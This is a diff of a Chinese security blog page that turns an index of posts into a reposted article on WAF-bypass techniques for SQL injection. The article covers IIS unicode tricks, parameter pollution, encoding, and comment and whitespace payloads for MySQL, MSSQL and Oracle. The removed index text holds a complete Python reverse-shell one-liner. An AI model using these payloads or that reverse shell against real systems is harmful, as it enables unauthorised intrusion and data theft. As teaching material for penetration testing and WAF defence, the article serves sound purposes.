@@ -6,13 +6,16 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>ConanStudio</title>
+  <title>绕过WAF的各种特性 | ConanStudio</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="ConanStudio">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;index.html">
+  <meta name="description" content="那些可以绕过WAF的各种特性 我们一般将安全防护软件划分为：云WAF、硬件waf、主机防护软件、软件waf等。 在攻防实战中，往往需要掌握一些特性，比如服务器、数据库、应用层、WAF层等，以便我们更灵活地去构造Payload，从而可以和各种WAF进行对抗，甚至绕过安全防御措施进行漏洞利用。 此文为转载">
+<meta property="og:type" content="article">
+<meta property="og:title" content="绕过WAF的各种特性">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;09&#x2F;02&#x2F;%E7%BB%95%E8%BF%87WAF%E7%9A%84%E5%90%84%E7%A7%8D%E7%89%B9%E6%80%A7&#x2F;index.html">
 <meta property="og:site_name" content="ConanStudio">
+<meta property="og:description" content="那些可以绕过WAF的各种特性 我们一般将安全防护软件划分为：云WAF、硬件waf、主机防护软件、软件waf等。 在攻防实战中，往往需要掌握一些特性，比如服务器、数据库、应用层、WAF层等，以便我们更灵活地去构造Payload，从而可以和各种WAF进行对抗，甚至绕过安全防御措施进行漏洞利用。 此文为转载">
 <meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2020-09-02T08:15:22.756Z">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="ConanStudio" type="application/atom+xml">
@@ -153,418 +156,14 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-python反弹shell" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-绕过WAF的各种特性" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/02/python%E5%8F%8D%E5%BC%B9shell/">python反弹shell</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/02/python%E5%8F%8D%E5%BC%B9shell/" class="archive-article-date">
-  	<time datetime="2020-09-02T09:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-02</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>服务端nc监听</p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/python%E5%8F%8D%E5%BC%B9shell/1.png" alt="img"></p>
-<p>客户端运行如下命令</p>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/python%E5%8F%8D%E5%BC%B9shell/2.png" alt="img"></p>
-<p>python -c “import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((‘xx.xx.xx.xx’,8423));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([‘/bin/bash’,’-i’]);”</p>
-        
-          <a class="article-more-a" href="/2020/09/02/python%E5%8F%8D%E5%BC%B9shell/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/02/python%E5%8F%8D%E5%BC%B9shell/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-制作Python版Jar包实验" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/02/%E5%88%B6%E4%BD%9CPython%E7%89%88Jar%E5%8C%85%E5%AE%9E%E9%AA%8C/">制作Python版Jar包实验</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/02/%E5%88%B6%E4%BD%9CPython%E7%89%88Jar%E5%8C%85%E5%AE%9E%E9%AA%8C/" class="archive-article-date">
-  	<time datetime="2020-09-02T08:56:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-02</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>主要是摆脱python第三方依赖</p>
-<p>linux自带python2环境  现在测试一下</p>
-        
-          <a class="article-more-a" href="/2020/09/02/%E5%88%B6%E4%BD%9CPython%E7%89%88Jar%E5%8C%85%E5%AE%9E%E9%AA%8C/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/02/%E5%88%B6%E4%BD%9CPython%E7%89%88Jar%E5%8C%85%E5%AE%9E%E9%AA%8C/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-本地-CPL实验" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/02/%E6%9C%AC%E5%9C%B0-CPL%E5%AE%9E%E9%AA%8C/">本地-CPL实验</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/02/%E6%9C%AC%E5%9C%B0-CPL%E5%AE%9E%E9%AA%8C/" class="archive-article-date">
-  	<time datetime="2020-09-02T08:46:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-02</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>cpl文件</p>
-<p>CPL文件，又叫控制面板项（Control Panel Item），多保存于系统安装目录的system32文件夹下，它们分别对应着控制面板中的项目，普通用户的访问受到限制。它可由shell32.dll、control.exe打开。此外，你也可以直接在资源管理器中双击调用Open命令打开（实质上调用了shell32.dll）。</p>
-<p>CPL文件本质是Windows可执行性文件，但不属于可以直接独立运行的文件，通常由shell32.dll打开。</p>
-<p>system32目录里绝大多数cpl文件是Windows系统文件，具有“存档”文件属性，Windows操作系统的文件保护功能保护它们不被篡改。</p>
-        
-          <a class="article-more-a" href="/2020/09/02/%E6%9C%AC%E5%9C%B0-CPL%E5%AE%9E%E9%AA%8C/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/02/%E6%9C%AC%E5%9C%B0-CPL%E5%AE%9E%E9%AA%8C/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Rootkit及后门实验" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/02/Rootkit%E5%8F%8A%E5%90%8E%E9%97%A8%E5%AE%9E%E9%AA%8C/">Rootkit及后门实验</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/02/Rootkit%E5%8F%8A%E5%90%8E%E9%97%A8%E5%AE%9E%E9%AA%8C/" class="archive-article-date">
-  	<time datetime="2020-09-02T08:34:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-02</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>贴子上的设计思路</p>
-<p>​        现在常用的 linux 维持权限的方法大多用 crontab 和开机自启动，同时使用的大多是msf 或者其它的 tcp 连接来反弹 shell ,这种做法比较容易被管理员发现。所以我们想有一个非 tcp 连接、流量不容易被怀疑的后门，并且在大量的 shell 的场景下，可以管理 shell ，因此采用 reptile+ishell+merlin 的组合。</p>
-<p>Reptile 是种 LKM rootkit，因此具有很好的隐藏性和强大的功能。</p>
-<p>LKM的全称为 Loadable Kernel Modules，中文名为可加载内核模块，主要作用是用来扩展 linux 的内核功能。LKM的优点在于可以动态地加载到内存中，无须重新编译内核。由于 LKM 具有这样的特点，所以它经常被用于一些设备的驱动程序，例如声卡，网卡等等。当然因为其优点，也经常被骇客用于 rootkit 技术当中。</p>
-        
-          <a class="article-more-a" href="/2020/09/02/Rootkit%E5%8F%8A%E5%90%8E%E9%97%A8%E5%AE%9E%E9%AA%8C/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/02/Rootkit%E5%8F%8A%E5%90%8E%E9%97%A8%E5%AE%9E%E9%AA%8C/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Adobe-flash-player-28（CVE-2018-4878）攻击实验" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/02/Adobe-flash-player-28%EF%BC%88CVE-2018-4878%EF%BC%89%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/">Adobe flash player 28（CVE-2018-4878）攻击实验</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/02/Adobe-flash-player-28%EF%BC%88CVE-2018-4878%EF%BC%89%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/" class="archive-article-date">
-  	<time datetime="2020-09-02T08:30:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-02</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>​       2018年1月31日，韩国CERT发布公告称发现Flash 0day漏洞的野外利用，攻击者执行针对性的攻击；2月1日Adobe发布安全公告，确认Adobe Flash Player 28.0.0.137 及早期版本存在远程代码执行漏洞（CVE-2018-4878）；2月2日，Cisco Talos团队发布了事件涉及攻击样本的简要分析；2月7日，Adobe发布了CVE-2018-4878漏洞的安全补丁。</p>
-        
-          <a class="article-more-a" href="/2020/09/02/Adobe-flash-player-28%EF%BC%88CVE-2018-4878%EF%BC%89%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/02/Adobe-flash-player-28%EF%BC%88CVE-2018-4878%EF%BC%89%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Holer内网穿透搭建记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/02/Holer%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/">Holer内网穿透搭建记录</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/02/Holer%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/" class="archive-article-date">
-  	<time datetime="2020-09-02T08:15:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-02</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>在公网服务器上搭建holer服务端</p>
-<p>Holer是一个将局域网中的应用映射到公网访问的端口映射软件，支持转发基于TCP协议的报文。 </p>
-        
-          <a class="article-more-a" href="/2020/09/02/Holer%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/02/Holer%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-绕过WAF的各种特性" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/02/%E7%BB%95%E8%BF%87WAF%E7%9A%84%E5%90%84%E7%A7%8D%E7%89%B9%E6%80%A7/">绕过WAF的各种特性</a>
+    <h1 class="article-title" itemprop="name">
+      绕过WAF的各种特性
     </h1>
   
 
@@ -581,155 +180,159 @@
 <p>我们一般将安全防护软件划分为：云WAF、硬件waf、主机防护软件、软件waf等。</p>
 <p>在攻防实战中，往往需要掌握一些特性，比如服务器、数据库、应用层、WAF层等，以便我们更灵活地去构造Payload，从而可以和各种WAF进行对抗，甚至绕过安全防御措施进行漏洞利用。</p>
 <p>此文为转载</p>
-        
-          <a class="article-more-a" href="/2020/09/02/%E7%BB%95%E8%BF%87WAF%E7%9A%84%E5%90%84%E7%A7%8D%E7%89%B9%E6%80%A7/#more">more >></a>
-        
-      
+<a id="more"></a>
 
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/02/%E7%BB%95%E8%BF%87WAF%E7%9A%84%E5%90%84%E7%A7%8D%E7%89%B9%E6%80%A7/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-XSS绕过技术" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/02/XSS%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/">XSS绕过技术</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/02/XSS%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/" class="archive-article-date">
-  	<time datetime="2020-09-02T08:12:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-02</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>XSS 绕过技术 </p>
-<p>Cross-Site Scripting（XSS）是一类出现在 web 应用程序上的安全弱点，攻击者可以通过 XSS 插入一 些代码，使得访问页面的其他用户都可以看到，XSS 通常是可以被看作漏洞的。它允许攻击者绕过安全机 制，通过尝试各种不同的方法插入恶意代码，攻击者可以得到敏感页面的权限，会话，cookies，或者其 他的东西，XSS 分为三类 </p>
-<p>XSS 分类： 非持久性，持久性和基于 Dom（此类可以是持久的，也可以是不持久的） </p>
-        
-          <a class="article-more-a" href="/2020/09/02/XSS%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/09/02/XSS%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-内网渗透命令备忘" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98/">内网渗透命令备忘</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98/" class="archive-article-date">
-  	<time datetime="2020-09-02T08:05:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-02</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>查询操作系统和版本信息</p>
+<p><strong>0x01 服务器特性</strong></p>
+<p><strong>1、%特性（ASP+IIS）</strong></p>
+<p>在asp+iis的环境中存在一个特性，就是特殊符号%，在该环境下当们我输入s%elect的时候，在WAF层可能解析出来的结果就是s%elect，但是在iis+asp的环境的时候，解析出来的结果为select。</p>
+<p>PS：此处猜测可能是iis下asp.dll解析时候的问题，aspx+iis的环境就没有这个特性。</p>
+<p><strong>2、%u特性（asp+iis和aspx+iis）</strong></p>
+<p>Iis服务器支持对于unicode的解析，例如我们对于select中的字符进行unicode编码，可以得到如下的s%u006c%u0006ect，这种字符在IIS接收到之后会被转换为select，但是对于WAF层，可能接收到的内容还是s%u006c%u0006ect，这样就会形成bypass的可能。</p>
+<p><strong>3、另类%u特性（ASP+IIS）</strong></p>
+<p>该漏洞主要利用的是unicode在iis解析之后会被转换成multibyte，但是转换的过程中可能出现：多个widechar会有可能转换为同一个字符。打个比方就是譬如select中的e对应的unicode为%u0065，但是%u00f0同样会被转换成为e。</p>
 <ul>
-<li><p>systeminfo | findstr /B /C:”OS Name” /C:”OS Version”</p>
-</li>
-<li><p>systeminfo | findstr /B /C:”OS 名称” /C:”OS 版本”</p>
-</li>
+<li>s%u0065lect-&gt;select s%u00f0lect-&gt;select</li>
 </ul>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98/1.png" alt="img"></p>
-<p>查看系统体系结构</p>
+<p>WAF层可能能识别s%u0065lect的形式，但是很有可能识别不了s%u00f0lect的形式。这样就可以利用起来做WAF的绕过。</p>
+<p>常见三个关键字（union+select+from）的测试情况：</p>
 <ul>
-<li>echo %PROCESSOR_ARCHITECTURE%</li>
+<li>s%u0045lect = s%u0065lect = %u00f0lectu –&gt; %u0055 –&gt; %u0075n –&gt;%u004e –&gt; %u006ei –&gt;%u0049 –&gt; %u0069o –&gt;%u004f –&gt; %u006f –&gt;%u00bas –&gt;%u0053 –&gt; %u0073l –&gt;%u004c –&gt; %u006ce –&gt;%u0045 –&gt; %u0065–&gt;%u00f0c –&gt;%u0043 –&gt; %u0063t –&gt;%u0054 –&gt;%u0074 –&gt;%u00de –&gt;%u00fef –&gt;%u0046 –&gt;%u0066r –&gt;%u0052 –&gt;%u0072m –&gt;%u004d –&gt;%u006d</li>
 </ul>
-<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98/2.png" alt="img"></p>
-        
-          <a class="article-more-a" href="/2020/09/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98/#more">more >></a>
-        
+<p><strong>4、apache畸形method</strong></p>
+<p>在GET请求中，GET可以替换为任意参数名字，不影响apahce接收参数id=2。</p>
+<ul>
+<li>TEST /sql.php?id=1 HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1</li>
+</ul>
+<p><strong>0x02 应用层特性</strong></p>
+<p><strong>1、大小写/关键字替换</strong></p>
+<p>这是最简单的绕过技术，用来绕过只针对特定关键字，大小写不敏感。</p>
+<ul>
+<li>id=1 UnIoN/**/SeLeCT 1,user()</li>
+</ul>
+<p>将关键字进行等价替换：</p>
+<ul>
+<li>Hex() bin() 等价于ascii()Sleep() 等价于 benchmark()Mid()substring() 等价于 substr()@@user 等价于 User()@@Version 等价于 version()</li>
+</ul>
+<p><strong>2、双重url编码</strong></p>
+<p>双重url编码，即对客户端发送的数据进行了两次urlencode操作，如s做一次url编码是%73,再进行一次编码是%25%37%33。一般情况下在代码层默认做一次url解码，这样解码之后的数据一般不会匹配到规则，达到了bypass的效果。</p>
+<p>编码方式，如char或Hex编码、Unicode编码、BASE64编码等。</p>
+<p><strong>3、变换请求方式</strong></p>
+<p>将GET变成POST提交，或者POST请求将urlencode和form-data转换。</p>
+<p>在POST请求中，可以将Post数据包转为上传multipart/form-data格式数据包。</p>
+<p>构造参数提交代码：</p>
+<html><head></head><body><form action="http://192.168.204.128/test.php" method="post" enctype="multipart/form-data"><input type="text" name="id"><input type="submit"></form></body>` `</html>
+
+<p>上传数据包参数：</p>
+<p>——WebKitFormBoundaryACZoaLJJzUwc4hYMContent-Disposition: form-data; name=”id”1from information_schema.SCHEMATA——WebKitFormBoundaryACZoaLJJzUwc4hYM–</p>
+<p><strong>4、HPP参数污染</strong></p>
+<p>类似?id=1&amp;id=2&amp;id=3的形式，此种形式在获取id值的时候不同的web技术获取的值是不一样的。</p>
+<p>假设提交的参数即为：</p>
+<p>id=1&amp;id=2&amp;id=3</p>
+<p>得到的结果：Asp.net + iis：id=1,2,3 Asp + iis：id=1,2,3 Php + apache：id=3多种变形：MSSQL:大小写：?id=1 UNION/<em>&amp;ID=</em>/SELECT 1,2/<em>&amp;Id=</em>/FROM ADMINGET+POST形式: <a href="http://192.168.125.140/test/sql.aspx?id=1" target="_blank" rel="noopener">http://192.168.125.140/test/sql.aspx?id=1</a> union/<em>post:  id=2</em>/select null,null,null利用逗号：?id=1 union select 1&amp;id=2&amp;id=3&amp;id=4 from admin–（无逗号形式）        ?a=1+union/<em>&amp;b=</em>/select+1,pass/<em>&amp;c=</em>/from+users–(分割参数注入)无效参数形式：?a=/<em>&amp;sql=xxx&amp;b=</em>/  备注：a,b为无效参数，让waf误以为我们输入的语句是在注释符里面执行的所以就不拦截溢出形式：?id=1/<em>&amp;id=</em>//<em>&amp;id=</em>//<em>……&amp;id=</em>//<em>&amp;id=</em>/ union  select null,system_user,null from INFORMATION_SCHEMA.schemata</p>
+<p>Mysql：?id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=….. &amp;id=1 union select 1,2 from admin</p>
+<p><strong>5、宽字节</strong></p>
+<p>宽字节关键字对照表：</p>
+<p>union = uю%69яю这里把i不用宽字节 直接url编码 其他的字符都用对应的宽字节select = こхlх%уt //t不编码 其他的都宽字节 中间插上%from = цR%яэ //宽字节+%空格=%20=%ва //в是2的款字符 а是0的宽字符, = Ь //,号的宽字节</p>
+<p><strong>0x03 数据库特性</strong></p>
+<p><strong>1、Mysql技巧</strong></p>
+<p>（1）mysql注释符有三种：#、/<em>…</em>/、–  … (注意–后面有一个空格)</p>
+<p>（2）空格符:[0x09,0x0a-0x0d,0x20,0xa0]</p>
+<p>（3）特殊符号：%a 换行符</p>
+<p>   可结合注释符使用%23%0a，%2d%2d%0a。</p>
+<p>（3）内联注释：</p>
+<p>   /<em>!UnIon12345SelEcT</em>/ 1,user()   //数字范围 1000-50540</p>
+<p>（4）mysql黑魔法</p>
+<p>  select{x username}from {x11 test.admin};</p>
+<p><strong>2、SQL Server技巧</strong></p>
+<p>（1）用来注释掉注射后查询的其余部分：</p>
+<p>​    /*      C语言风格注释</p>
+<p>​    –      SQL注释</p>
+<p>​    ; 00％ 空字节</p>
+<p>（2）空白符：[0x01-0x20]</p>
+<p>（3）特殊符号：%3a 冒号</p>
+<p>​     id=1 union:select 1,2 from:admin</p>
+<p>（4）函数变形：如db_name<a href="">空白字符</a></p>
+<p><strong>3、Oracle技巧</strong></p>
+<p>（1）注释符：–、/**/</p>
+<p>（2）空白字符：[0x00,0x09，0x0a-0x0d,0x20]</p>
+<p><strong>4、更多特性</strong></p>
+<p>那些代码层防护，只能用数据库特性来正面怼，一般一个SQL语句组成包括如下几个位置：</p>
+<ul>
+<li>select * from admin where id=1【位置一】union【位置二】select【位置三】1,2,db_name()【位置四】from【位置五】admin</li>
+</ul>
+<p>通过对常见的5个位置进行FUZZ，可以探索更多能够绕过WAF的数据库特性。参考以前的相关文章链接：</p>
+<p><a href="http://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&mid=2448903977&idx=1&sn=008229fe76b96e4a229a3a4144fcb284&chksm=8b55df74bc225662a50c05b4e7a1a911e177e3e276658571c0438bba803a69fff0e1748f4812&scene=21#wechat_redirect" target="_blank" rel="noopener">WAF Bypass数据库特性（Mysql探索篇）</a></p>
+<p><a href="http://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&mid=2448903991&idx=1&sn=6bd5b6988dc0464f0a3170de6d5e3cae&chksm=8b55df6abc22567ce93b042363a40f7c78775a95ce37232f5983c361993ef23b0f07ef2515b9&scene=21#wechat_redirect" target="_blank" rel="noopener">WAF Bypass数据库特性（MSsql探索篇）</a></p>
+<p><a href="http://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&mid=2448903996&idx=1&sn=9e2a7f2bd659781d1cd244bcadb74f6b&chksm=8b55df61bc2256774d09cbf4ac24ad83bb53fec33f69c6de2bebfe3dbfbdaed8599b9995b0d1&scene=21#wechat_redirect" target="_blank" rel="noopener">WAF Bypass数据库特性（Oracle探索篇）</a></p>
+<p><a href="http://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&mid=2448903997&idx=1&sn=b77179090e88e8be9e7eb81ee148202b&chksm=8b55df60bc22567631c12e86450390a9e14cf50fc73e0cd19d17610b8ccc63fd761b25df9705&scene=21#wechat_redirect" target="_blank" rel="noopener">WAF Bypass数据库特性（Access探索篇）</a></p>
+<p><strong>0x04 WAF 层</strong></p>
+<p><strong>1、逻辑问题</strong></p>
+<p>（1）云waf防护，一般我们会尝试通过查找站点的真实IP，从而绕过CDN防护。</p>
